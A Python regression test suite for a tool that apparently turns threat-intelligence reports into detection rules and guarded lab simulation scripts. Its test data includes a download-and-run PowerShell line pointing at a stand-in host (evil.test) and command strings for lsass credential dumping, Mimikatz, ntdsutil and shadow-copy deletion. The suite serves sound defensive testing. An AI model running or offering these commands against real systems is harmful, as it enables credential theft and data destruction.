"""Regression tests for pipeline / converter hardening (no API calls)."""
from __future__ import annotations

import copy
import json
import re
import time
import uuid
import xml.etree.ElementTree as ET
from pathlib import Path
from types import SimpleNamespace

import anthropic
import httpx2
import pytest
import yaml

from ti2dac import condense as cmod
from ti2dac import duplicates, pipeline, redact, replay, wazuh
from ti2dac import sigma_tools as st
from ti2dac.feedback import Store
from ti2dac.llm import LLM, LLMOutage
from ti2dac.models import (
    Clause,
    DetectionDraft,
    ExpectedEvent,
    FieldCondition,
    QueryResult,
    ReportAnalysis,
    Selection,
)
from ti2dac.render import load_record, render, save_record

from .conftest import SAMPLE_REPORT, FakeLLM, analysis, task_draft


def _run(settings, report_file, monkeypatch, fake=None, **kw):
    fake = fake or FakeLLM(settings, bad_first=False)
    monkeypatch.setattr(pipeline, "LLM", lambda s, *a, **k: fake)
    store = Store(settings.db_path)
    record, loaded = pipeline.run(str(report_file), settings, store=store, **kw)
    out = Path(settings.output_dir) / record.run_id
    render(record, out, raw=loaded.raw, filename=loaded.filename, redaction_map=loaded.redaction_map)
    store.register_run(record, str(out))
    return record, out, fake


# --------------------------------------------------------------------------- generated scripts
def test_model_text_cannot_leave_the_script_header_comment(settings, report_file, monkeypatch):
    class Inj(FakeLLM):
        def structured(self, stage, system, user, schema):
            r = super().structured(stage, system, user, schema)
            if schema is DetectionDraft:
                r.simulation.expected_events = [ExpectedEvent(
                    source="Sysmon\nIEX (iwr http://evil.test/p.ps1)\r\u2028calc.exe\x85\x0bwhoami", event_id="1\n", matching_fields="x")]
            return r

    _, out, _ = _run(settings, report_file, monkeypatch, fake=Inj(settings, bad_first=False))
    for script in (out / "simulations").rglob("*.ps1"):
        text = script.read_text()
        head = text[:text.index("# --- ti2dac lab guard")]
        assert all(ln.startswith("#") for ln in head.splitlines()), head   # nothing runs before the guard
        assert not re.search(r"[\r\x0b\x0c\x85\u2028\u2029]", head)


# --------------------------------------------------------------------------- transport errors
def _llm_with_stream(settings, exc):
    class Stream:
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def get_final_message(self):
            raise exc

    llm = LLM(settings)
    llm._client = SimpleNamespace(beta=SimpleNamespace(messages=SimpleNamespace(stream=lambda **kw: Stream())))
    return llm


def test_connection_drop_mid_stream_is_an_outage(settings):
    llm = _llm_with_stream(settings, httpx2.RemoteProtocolError("peer closed connection"))
    with pytest.raises(LLMOutage, match="mid-response"):
        llm.structured("generate", "s", "u", DetectionDraft)


def test_overloaded_sse_error_event_is_an_outage(settings):
    resp = httpx2.Response(200, request=httpx2.Request("POST", "https://api.anthropic.com/v1/messages"))
    body = {"type": "error", "error": {"type": "overloaded_error", "message": "Overloaded"}}
    llm = _llm_with_stream(settings, anthropic.APIStatusError(str(body), response=resp, body=body))
    with pytest.raises(LLMOutage):
        llm.structured("generate", "s", "u", DetectionDraft)


def test_unexpected_error_fails_one_rule_not_the_run(settings, report_file, monkeypatch):
    class Boom(FakeLLM):
        def structured(self, stage, system, user, schema):
            if schema is DetectionDraft and "PowerShell" in user:
                raise RuntimeError("socket gone")
            return super().structured(stage, system, user, schema)

    record, _, _ = _run(settings, report_file, monkeypatch, fake=Boom(settings, bad_first=False))
    assert [p.behaviour.id for p in record.packages] == ["B1"]
    assert any("B2 (T1059.001) not generated: RuntimeError: socket gone" in w for w in record.warnings)


# --------------------------------------------------------------------------- what reaches the AI
def test_translate_gets_the_ai_safe_rule(settings, tmp_path, monkeypatch):
    settings.llm_targets = ["sumologic"]
    rep = tmp_path / "Acme-IR-2026-0042-FINSRV01.md"
    rep.write_text(SAMPLE_REPORT)
    _, _, fake = _run(settings, rep, monkeypatch)
    sent = [u for stage, u in fake.calls if stage == "translate"]
    assert sent and not any("FINSRV01" in u or "sha256:" in u or "references" in u for u in sent)


def test_feedback_and_corrections_reuse_the_run_redaction_map(settings, report_file, monkeypatch):
    settings.llm_targets = ["sumologic"]
    record, out, fake = _run(settings, report_file, monkeypatch, explicit=["B1"])
    (out / "source").mkdir(exist_ok=True)
    (out / "source" / "redaction-map.json").write_text(json.dumps({"[HOST_1]": "fin-ws-77", "[USER_1]": "mkarim"}))
    known = pipeline.run_redaction_map(record, settings)
    # neither name matches a redaction pattern on its own: only the run's map knows them
    assert pipeline.redact_for_ai("mkarim saw it on fin-ws-77 and app-9", settings, known) == \
        "[USER_1] saw it on [HOST_1] and app-9"
    assert redact.redact("a.hossain and mkarim", known=known).text == "[USER_2] and [USER_1]"   # numbered after the map

    pkg = record.packages[0]
    docs = st.load_docs(pkg.rule_yaml)
    docs[0]["detection"]["filter_host"] = {"Computer": "fin-ws-77"}
    docs[0]["detection"]["condition"] = f"({docs[0]['detection']['condition']}) and not filter_host"
    fake.calls.clear()
    new = pipeline.apply_correction(record, pkg.slug, settings, corrected_yaml=st.dump_docs(docs), llm=fake, actor="bob")
    sent = "\n".join(u for _, u in fake.calls)
    assert sent and "fin-ws-77" not in sent and "[HOST_1]" in sent
    assert "fin-ws-77" in new.rule_yaml          # the stored rule keeps the human's real value

    # AI rewrite of that human rule: the model only sees placeholders, the new rule gets the real value back
    class Echo(FakeLLM):
        def structured(self, stage, system, user, schema):
            r = super().structured(stage, system, user, schema)
            if stage == "repair":
                assert "[HOST_1]" in user
                r.selections.append(Selection(name="filter_host", clauses=[Clause(conditions=[
                    FieldCondition(field="Computer", modifiers=[], values=["[HOST_1]"])])]))
                r.condition = f"({r.condition}) and not filter_host"
            return r

    echo = Echo(settings, bad_first=False)
    newer = pipeline.apply_correction(record, pkg.slug, settings, feedback_text="keep excluding fin-ws-77", llm=echo,
                                      actor="bob")
    assert echo.calls and not any("fin-ws-77" in u for _, u in echo.calls)
    assert "fin-ws-77" in newer.rule_yaml and "[HOST_1]" not in newer.rule_yaml


# --------------------------------------------------------------------------- condense
def test_condense_never_returns_an_empty_report():
    text = "".join(f"Step {i}: the actor ran cmd.exe /c whoami and created task {i} with schtasks.\n" for i in range(400))
    assert len(text) > 24_000 and "\n\n" not in text
    c = cmod.condense(text, 2000)
    assert c.text.strip() and c.condensed_tokens <= 2000 and "schtasks" in c.text
    prose = "Nothing procedural in this sentence at all. " * 2000
    assert cmod.condense(prose, 1000).text.strip()


def test_condense_keeps_distinct_blocks_with_a_shared_prefix():
    intro = "The operators then used the following command on the domain controller to continue the intrusion: "
    text = f"{intro}ntdsutil ifm create full c:\\temp\\x\n\n{intro}vssadmin delete shadows /all /quiet"
    c = cmod.condense(text, 10_000)
    assert "ntdsutil" in c.text and "vssadmin" in c.text


def test_condense_output_respects_the_budget_with_headings():
    text = "\n\n".join(f"## Section {i} about execution\n\nThe actor ran powershell.exe -enc AAAA on host {i}." for i in range(300))
    c = cmod.condense(text, 500)
    assert c.condensed_tokens <= 500


@pytest.mark.parametrize("rx,unit", [(cmod._CMD, "a-"), (redact._FQDN, "a-"), (redact._EMAIL, "0."), (redact._FQDN, "0-")])
def test_whole_report_regexes_are_linear(rx, unit):
    s = unit * 100_000 + "!"
    t = time.perf_counter()
    list(rx.finditer(s))
    assert time.perf_counter() - t < 1.5


def test_linear_regexes_still_match_realistic_text():
    assert [m.group(0) for m in cmod._CMD.finditer("(--evil.exe) then foo-bar.exe and x.y.ps1")] == \
        ["evil.exe", "foo-bar.exe", "y.ps1"]
    assert [m.group(1) for m in redact._FQDN.finditer("\\\\fs01.corp.local\\s and --dc01.corp.local")] == \
        ["fs01.corp.local", "dc01.corp.local"]
    assert [m.group(0) for m in redact._EMAIL.finditer("mail <j.doe@acme.com>, ...x@y.org")] == ["j.doe@acme.com", "x@y.org"]


def test_embedded_event_scan_is_linear_on_blank_lines():
    t = time.perf_counter()
    pipeline.extract_embedded_events("\n" * 200_000 + "a!")
    assert time.perf_counter() - t < 1.5


# --------------------------------------------------------------------------- Sigma / Wazuh output
def test_same_field_split_only_applies_to_its_own_clause():
    s = task_draft().sigma
    s.selections = [Selection(name="selection", clauses=[
        Clause(conditions=[FieldCondition(field="CommandLine", modifiers=["contains"], values=[v])
                           for v in ("rundll32", "comsvcs", "MiniDump")]),
        Clause(conditions=[FieldCondition(field="Image", modifiers=["endswith"], values=["\\procdump.exe"])])])]
    s.condition = "selection"
    y = st.render_rule(s, rule_id=str(uuid.uuid4()), author="t", references=[], tags=[])
    assert st.validate_rule(y)[0]
    evs = [{"EventID": 1, "Image": "C:\\t\\procdump.exe", "CommandLine": "procdump -ma lsass.exe"},
           {"EventID": 1, "Image": "C:\\w\\rundll32.exe", "CommandLine": "rundll32 comsvcs.dll MiniDump 624 x full"},
           {"EventID": 1, "Image": "C:\\w\\rundll32.exe", "CommandLine": "rundll32 comsvcs.dll"}]
    assert replay.evaluate(y, evs) == [0, 1]
    # single clause: unchanged layout
    s.selections[0].clauses = s.selections[0].clauses[:1]
    det = st.first_doc(st.render_rule(s, rule_id=str(uuid.uuid4()), author="t", references=[], tags=[]))["detection"]
    assert det["condition"] == "(selection and selection_and2 and selection_and3)"


def test_wazuh_keywords_are_substring_matches():
    s = task_draft().sigma
    s.selections = [Selection(name="keywords", clauses=[Clause(conditions=[
        FieldCondition(field="", modifiers=[], values=["Invoke-Mimikatz"])])])]
    s.condition = "keywords"
    (q,) = st.convert(st.render_rule(s, rule_id=str(uuid.uuid4()), author="t", references=[], tags=[]), ["wazuh_rule"])
    pats = [r.text for r in ET.fromstring(re.sub(r"<!--.*?-->", "", q.query, flags=re.S)).iter("regex")]
    assert pats and all(re.search(p, '{"commandLine":"powershell IEX; invoke-mimikatz -DumpCreds"}') for p in pats)


def _colliding_ids() -> tuple[str, str]:
    seen: dict[int, str] = {}
    for i in range(5000):
        rid = str(uuid.uuid5(uuid.NAMESPACE_URL, str(i)))
        slot = wazuh.rule_slot(rid)
        if slot in seen:
            return seen[slot], rid
        seen[slot] = rid
    raise AssertionError("no collision found")


def test_wazuh_rule_ids_do_not_collide_within_a_run():
    a, b = _colliding_ids()
    pkgs = []
    for rid in (a, b):
        (q,) = st.convert(st.render_rule(task_draft().sigma, rule_id=rid, author="t", references=[], tags=[]), ["wazuh_rule"])
        pkgs.append(SimpleNamespace(rule_id=rid, queries=[q, QueryResult(target="wazuh_rule", label="x", language="x",
                                                                         method="llm", query='<rule id="1">')]))
    ids = lambda: [r.get("id") for p in pkgs for r in ET.fromstring(
        re.sub(r"<!--.*?-->", "", p.queries[0].query, flags=re.S)).iter("rule")]
    assert len(set(ids())) < len(ids())
    wazuh.resolve_slot_collisions(pkgs)
    first = ids()
    assert len(set(first)) == len(first)
    wazuh.resolve_slot_collisions(pkgs)   # idempotent
    assert ids() == first and pkgs[0].queries[1].query == '<rule id="1">'


def test_duplicate_behaviours_get_distinct_rule_ids(settings, report_file, monkeypatch):
    class Dup(FakeLLM):
        def structured(self, stage, system, user, schema):
            if schema is ReportAnalysis:
                a = analysis()
                a.behaviours[1] = a.behaviours[0].model_copy(update={"id": "B2"})
                return a
            return super().structured(stage, system, user, schema)

    record, _, _ = _run(settings, report_file, monkeypatch, fake=Dup(settings, bad_first=False), explicit=["B1", "B2"])
    assert len(record.packages) == 2 and len({p.rule_id for p in record.packages}) == 2


# --------------------------------------------------------------------------- run folder
def test_concurrent_runs_of_one_report_get_distinct_ids(settings, report_file, monkeypatch):
    from ti2dac.ingest import load_report

    loaded = load_report(str(report_file), settings.fetch)
    a, b = pipeline._new_run_id(loaded, settings.output_dir), pipeline._new_run_id(loaded, settings.output_dir)
    assert a != b and (Path(settings.output_dir) / a).is_dir()
    record, out, _ = _run(settings, report_file, monkeypatch)   # render into its own reserved folder
    assert record.run_id not in (a, b) and (out / "run.json").is_file()


def test_save_record_is_atomic(settings, report_file, monkeypatch, tmp_path):
    record, out, _ = _run(settings, report_file, monkeypatch)
    before = (out / "run.json").read_text()
    monkeypatch.setattr(type(record), "model_dump_json", lambda *a, **k: (_ for _ in ()).throw(OSError("disk full")))
    with pytest.raises(OSError):
        save_record(record, out)
    assert (out / "run.json").read_text() == before and not list(out.glob(".run.json.*"))
    assert load_record(out).run_id == record.run_id


@pytest.mark.parametrize("name", ["..", ".", ""])
def test_source_filename_cannot_name_a_directory(settings, report_file, monkeypatch, name):
    record, out, _ = _run(settings, report_file, monkeypatch)
    render(record, out, raw=b"x", filename=name)
    assert (out / "source" / "report.bin").read_bytes() == b"x"


def test_deeply_nested_json_does_not_crash(tmp_path):
    deep = '{"a": ' * 100_000 + "1" + "}" * 100_000
    assert pipeline.extract_embedded_events(f"text\n{deep}\nmore") == []
    f = tmp_path / "events.json"
    f.write_text(deep)
    with pytest.raises(replay.ReplayError):
        replay.load_events(f)


def test_malformed_repo_rules_are_skipped(settings, tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "list.yml").write_text(yaml.safe_dump({"title": "x", "detection": ["a", "b"], "logsource": "windows"}))
    (repo / "str.yml").write_text(yaml.safe_dump({"title": "y", "detection": "selection", "tags": 5}))
    good = copy.deepcopy(st.first_doc(st.render_rule(task_draft().sigma, rule_id=str(uuid.uuid4()), author="t",
                                                     references=[], tags=[])))
    good["id"] = "other"
    (repo / "good.yml").write_text(yaml.safe_dump(good))
    settings.rule_repos = [str(repo)]
    rule = st.render_rule(task_draft().sigma, rule_id=str(uuid.uuid4()), author="t", references=[], tags=[])
    assert any("other" in s for s in duplicates.find_similar(rule, settings))


# --------------------------------------------------------------------------- live Salat run, 2026-11-05
_RUN_KEY = r"""title: Run key to random AppData exe
id: d9586855-30fb-56ad-890f-b744f3cc3e0f
status: experimental
logsource: {product: windows, category: registry_set}
detection:
  selection_key:
    TargetObject|contains: '\Microsoft\Windows\CurrentVersion\Run'
  selection_value:
    Details|re: '(?i)\\AppData\\Roaming\\[a-z0-9]{14}\\[a-z0-9]{5}\.exe'
  condition: selection_key and selection_value
level: high
"""


def test_inline_regex_flags_become_modifiers_and_every_target_handles_them():
    d = task_draft()
    d.sigma.selections.append(Selection(name="selection_re", clauses=[Clause(conditions=[
        FieldCondition(field="CommandLine", modifiers=["re"], values=[r"(?i)/sc\s+onlogon"])])]))
    det, _ = st.build_detection(d.sigma)
    assert det["selection_re"] == {"CommandLine|re|i": r"/sc\s+onlogon"}

    # a rule that still carries the inline group (e.g. an older run): Wazuh used to fail, EQL/Lucene degraded
    by = {q.target: q for q in st.convert(_RUN_KEY, ["wazuh_rule", "elastic_eql", "elastic_lucene", "splunk"])}
    assert by["wazuh_rule"].error is None and "(?i:" in by["wazuh_rule"].query
    assert "(?i)" not in by["elastic_eql"].query and "regex~" in by["elastic_eql"].query
    lucene = by["elastic_lucene"].query   # Lucene has no (?i): the letters are case-folded instead
    assert "(?i)" not in lucene and "[aA][pP][pP][dD][aA][tT][aA]" in lucene and "[a-z0-9A-Z]{14}" in lucene
    assert "(?i)" in by["splunk"].query and "(?i)" not in by["splunk"].notes


def test_human_correction_with_inline_flag_is_stored_with_the_modifier(settings, report_file, monkeypatch):
    record, _, _ = _run(settings, report_file, monkeypatch)
    pkg = record.packages[0]
    doc = yaml.safe_load(pkg.rule_yaml)
    doc["detection"]["selection_extra"] = {"CommandLine|re": "(?i)onlogon"}
    doc["detection"]["condition"] += " and selection_extra"
    new = pipeline.apply_correction(record, pkg.slug, settings, corrected_yaml=yaml.safe_dump(doc, sort_keys=False))
    assert yaml.safe_load(new.rule_yaml)["detection"]["selection_extra"] == {"CommandLine|re|i": "onlogon"}


def test_missing_fields_are_not_available_rather_than_failed():
    assert st.conversion_problem("SigmaTransformationError: Invalid SigmaDetectionItem field name encountered: "
                                 "OriginalFileName.") == "not-available"
    assert st.conversion_problem("SigmaTransformationError: field 'Details' is not supported") == "not-available"
    assert st.conversion_problem("crowdstrike_cql pipeline has no field mapping for this log source") == "not-available"
    assert st.conversion_problem("error: global flags not at the start of the expression at position 3") == "failed"


def test_retried_rule_clears_its_old_failure_and_stale_chain_warnings(settings, report_file, monkeypatch):
    record, _, fake = _run(settings, report_file, monkeypatch)
    have = {p.behaviour.id for p in record.packages}
    b = next(x for x in record.behaviours if x.id not in have)
    old = f"{b.id} ({b.technique_id}) not generated: generate: bad request: grammar too large"
    stale = f"Sequence 'Old' ({b.id} -> B1) needs rules for {b.id} first: ti2dac generate x --select {b.id}"
    record.warnings += [old, stale]
    pipeline.generate(record, settings, fake, behaviour_ids=[b.id])
    assert b.id in {p.behaviour.id for p in record.packages}
    assert old not in record.warnings and stale not in record.warnings


def test_pe_metadata_file_names_are_not_brittle_artifacts():
    from ti2dac import quality

    rule = ("detection:\n  sel:\n    OriginalFileName: ApplicationFrameHost.exe\n  sel2:\n    Image|endswith: '\\loader.exe'\n"
            "  condition: sel and sel2\n")
    assert quality.brittle_artifacts(rule, ["ApplicationFrameHost.exe", "loader.exe"]) == ["loader.exe"]
    assert quality.brittle_artifacts(rule.replace("OriginalFileName", "Image"), ["applicationframehost.exe"]) == []


def test_selftest_flags_filters_no_benign_event_exercises():
    from ti2dac.models import EventField, TestEvent

    rule = ("title: t\nlogsource: {product: windows, category: process_creation}\ndetection:\n"
            "  sel: {Image|endswith: '\\reagentc.exe'}\n  filter_sccm: {ParentImage|endswith: '\\ccmexec.exe'}\n"
            "  condition: sel and not filter_sccm\n")

    def ev(match, **f):
        return TestEvent(description="e", should_match=match, fields=[EventField(name=k, value=v) for k, v in f.items()])

    pos = ev(True, Image="C:\\Windows\\System32\\reagentc.exe", ParentImage="C:\\Windows\\explorer.exe")
    other = ev(False, Image="C:\\Windows\\System32\\cmd.exe", ParentImage="C:\\Windows\\explorer.exe")
    sccm = ev(False, Image="C:\\Windows\\System32\\reagentc.exe", ParentImage="C:\\Windows\\CCM\\ccmexec.exe")
    assert replay.untested_filters(rule, [pos, other]) == ["filter_sccm"]
    assert replay.untested_filters(rule, [pos, other, sccm]) == []


def test_atomic_test_and_lint_guard_the_recovery_simulation(settings, report_file, monkeypatch):
    from ti2dac import safety

    record, out, _ = _run(settings, report_file, monkeypatch)
    atomic = next(out.glob("simulations/*/atomic-test.yaml")).read_text()
    test = yaml.safe_load(atomic)["atomic_tests"][0]["executor"]
    assert "TI2DAC_LAB" in test["command"] and "TI2DAC_LAB" in test["cleanup_command"]
    found = {(f.rule, f.severity) for f in safety.lint_script("reagentc /disable", cleanup="Remove-Item $env:TEMP\\x")}
    assert ("recovery-tamper", "warn") in found and ("missing-cleanup", "warn") in found
    regs = safety.lint_script("Set-ItemProperty -Path HKCU:\\Software\\x -Name a -Value b", cleanup="Remove-Item $env:TEMP\\a")
    assert any(f.rule == "missing-cleanup" for f in regs)
    assert not any(f.rule == "missing-cleanup" for f in safety.lint_script(
        "Set-ItemProperty -Path HKCU:\\Software\\x -Name a -Value b", cleanup="Remove-ItemProperty -Path HKCU:\\Software\\x -Name a"))


def test_every_configured_target_converts_a_plain_process_rule():
    # A pipeline copy once broke splunk_cim ("cannot pickle 'dict_keys'") and nothing noticed
    from ti2dac.config import Settings

    rule = ("title: t\nid: 47dfd07a-7bd4-5661-ab4f-1f37e10cd6af\nstatus: experimental\n"
            "logsource: {product: windows, category: process_creation}\n"
            "detection:\n  sel: {Image|endswith: '\\reagentc.exe', CommandLine|contains: ' /disable'}\n  condition: sel\n")
    failed = {q.target: q.error for q in st.convert(rule, Settings().targets) if q.error}
    assert failed == {}, failed


def test_one_rules_missing_field_never_appears_in_the_next_rules_error():
    rule = ("title: t\nid: 47dfd07a-7bd4-5661-ab4f-1f37e10cd6af\nstatus: experimental\n"
            "logsource: {product: windows, category: %s}\ndetection:\n  sel: {%s: x}\n  condition: sel\n")
    errors = [st.convert(rule % (cat, f), ["sentinel_securityevent"])[0].error
              for cat, f in [("process_creation", "OriginalFileName"), ("process_creation", "OriginalFileName"),
                             ("process_creation", "Company")]]
    assert errors[0] == errors[1] and "OriginalFileName" not in errors[2] and "Company" in errors[2]


# --------------------------------------------------------------------------- Sentinel SecurityEvent coverage
_PROC = ("title: t\nid: 723ff70c-6703-5ee5-8219-64aabe455c79\nstatus: experimental\n"
         "logsource: {product: windows, category: process_creation}\ndetection:\n%s  condition: %s\n")


def test_securityevent_drops_an_or_alternative_it_cannot_express_and_says_so():
    rule = _PROC % ("  sel_img:\n  - Image|endswith: '\\reagentc.exe'\n  - OriginalFileName: reagentc.exe\n"
                    "  sel_cli: {CommandLine|contains: ' /disable'}\n", "sel_img and sel_cli")
    q = st.convert(rule, ["sentinel_securityevent"])[0]
    assert q.error is None and 'NewProcessName endswith "\\\\reagentc.exe"' in q.query
    assert "OriginalFileName" not in q.query and "without the OriginalFileName alternative in sel_img" in q.notes
    # a field the rule requires (AND-ed) is never dropped: that would change what the rule means
    required = _PROC % ("  sel: {OriginalFileName: reagentc.exe, CommandLine|contains: ' /disable'}\n", "sel")
    q = st.convert(required, ["sentinel_securityevent"])[0]
    assert q.query is None and st.conversion_problem(q.error) == "not-available"


def test_securityevent_registry_rule_uses_the_4657_columns():
    rule = ("title: t\nid: d9586855-30fb-56ad-890f-b744f3cc3e0f\nstatus: experimental\n"
            "logsource: {product: windows, category: registry_set}\ndetection:\n"
            "  sel: {TargetObject|contains: '\\CurrentVersion\\Run', Details|endswith: '.exe'}\n"
            "  filter: {Image|endswith: '\\msiexec.exe'}\n  condition: sel and not filter\n")
    q = st.convert(rule, ["sentinel_securityevent"])[0].query
    assert "EventID == 4657" in q and 'NewValue endswith ".exe"' in q
    assert 'ProcessName endswith "\\\\msiexec.exe"' in q and "NewProcessName" not in q   # 4688's column
